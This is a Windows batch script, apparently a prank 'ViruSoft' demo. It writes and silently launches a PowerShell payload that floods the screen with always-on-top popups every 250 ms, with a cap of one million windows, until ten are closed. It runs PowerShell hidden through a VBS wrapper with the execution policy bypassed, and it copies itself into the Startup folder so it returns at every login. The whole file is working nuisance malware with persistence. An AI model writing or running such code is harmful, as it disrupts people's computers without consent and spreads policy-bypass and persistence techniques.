@echo off
setlocal

set "DEMO=%TEMP%\ViruSoftDemo"
set "PS=%DEMO%\ViruSoftPopup.ps1"
set "VBS=%DEMO%\start.vbs"

if exist "%DEMO%" rd /s /q "%DEMO%" >nul 2>&1
mkdir "%DEMO%" >nul 2>&1

> "%PS%" echo Add-Type -AssemblyName System.Windows.Forms
>>"%PS%" echo Add-Type -AssemblyName System.Drawing
>>"%PS%" echo [System.Windows.Forms.Application]::EnableVisualStyles()
>>"%PS%" echo $random = New-Object System.Random
>>"%PS%" echo $timer = New-Object System.Windows.Forms.Timer
>>"%PS%" echo $timer.Interval = 250
>>"%PS%" echo $totalCreated = 0
>>"%PS%" echo $closedCount = 0
>>"%PS%" echo $ending = $false
>>"%PS%" echo $maxTotal = 1000000
>>"%PS%" echo $maxOpen = 1000000
>>"%PS%" echo $screen = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
>>"%PS%" echo
>>"%PS%" echo $timer.Add_Tick({
>>"%PS%" echo     if ($script:ending) { return }
>>"%PS%" echo
>>"%PS%" echo     $open = @([System.Windows.Forms.Application]::OpenForms)
>>"%PS%" echo     if ($open.Count -ge $script:maxOpen) { return }
>>"%PS%" echo
>>"%PS%" echo     if ($script:totalCreated -ge $script:maxTotal) {
>>"%PS%" echo         $timer.Stop()
>>"%PS%" echo         return
>>"%PS%" echo     }
>>"%PS%" echo
>>"%PS%" echo     $script:totalCreated++
>>"%PS%" echo
>>"%PS%" echo     $form = New-Object System.Windows.Forms.Form
>>"%PS%" echo     $form.Text = '(C) ViruSoft 1990'
>>"%PS%" echo     $form.FormBorderStyle = 'FixedToolWindow'
>>"%PS%" echo     $form.StartPosition = 'Manual'
>>"%PS%" echo     $form.Size = New-Object System.Drawing.Size(300,135)
>>"%PS%" echo     $form.BackColor = [System.Drawing.Color]::Black
>>"%PS%" echo     $form.TopMost = $true
>>"%PS%" echo
>>"%PS%" echo     $label = New-Object System.Windows.Forms.Label
>>"%PS%" echo     $label.Dock = 'Fill'
>>"%PS%" echo     $label.TextAlign = 'MiddleCenter'
>>"%PS%" echo     $label.Font = New-Object System.Drawing.Font('Consolas',11,[System.Drawing.FontStyle]::Bold)
>>"%PS%" echo     $label.ForeColor = [System.Drawing.Color]::Lime
>>"%PS%" echo     $label.BackColor = [System.Drawing.Color]::Black
>>"%PS%" echo     $label.Text = '(C) ViruSoft 1990'
>>"%PS%" echo     $form.Controls.Add($label)
>>"%PS%" echo
>>"%PS%" echo     $maxX = [Math]::Max($screen.Left + 1, $screen.Right - $form.Width)
>>"%PS%" echo     $maxY = [Math]::Max($screen.Top + 1, $screen.Bottom - $form.Height)
>>"%PS%" echo     $x = $random.Next($screen.Left,$maxX)
>>"%PS%" echo     $y = $random.Next($screen.Top,$maxY)
>>"%PS%" echo     $form.Location = New-Object System.Drawing.Point($x,$y)
>>"%PS%" echo
>>"%PS%" echo     $form.Add_FormClosed({
>>"%PS%" echo         if ($script:ending) { return }
>>"%PS%" echo
>>"%PS%" echo         $script:closedCount++
>>"%PS%" echo
>>"%PS%" echo         if ($script:closedCount -ge 10) {
>>"%PS%" echo             $script:ending = $true
>>"%PS%" echo             $timer.Stop()
>>"%PS%" echo
>>"%PS%" echo             foreach ($window in @([System.Windows.Forms.Application]::OpenForms)) {
>>"%PS%" echo                 $window.Close()
>>"%PS%" echo             }
>>"%PS%" echo         }
>>"%PS%" echo     })
>>"%PS%" echo
>>"%PS%" echo     $form.Show()
>>"%PS%" echo })
>>"%PS%" echo
>>"%PS%" echo $timer.Start()
>>"%PS%" echo [System.Windows.Forms.Application]::Run()

> "%VBS%" echo Set shell = CreateObject("WScript.Shell")
>>"%VBS%" echo shell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ ^& "%PS%" ^& """", 0, False

cscript //nologo "%VBS%"

wscript.exe "%VBS%"

:: AUTOSTART
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if not exist "%STARTUP%\MeineDemo.bat" (
    copy "%~f0" "%STARTUP%\MeineDemo.bat" >nul 2>&1
    echo Autostart eingerichtet.
)

endlocal
exit /b

endlocal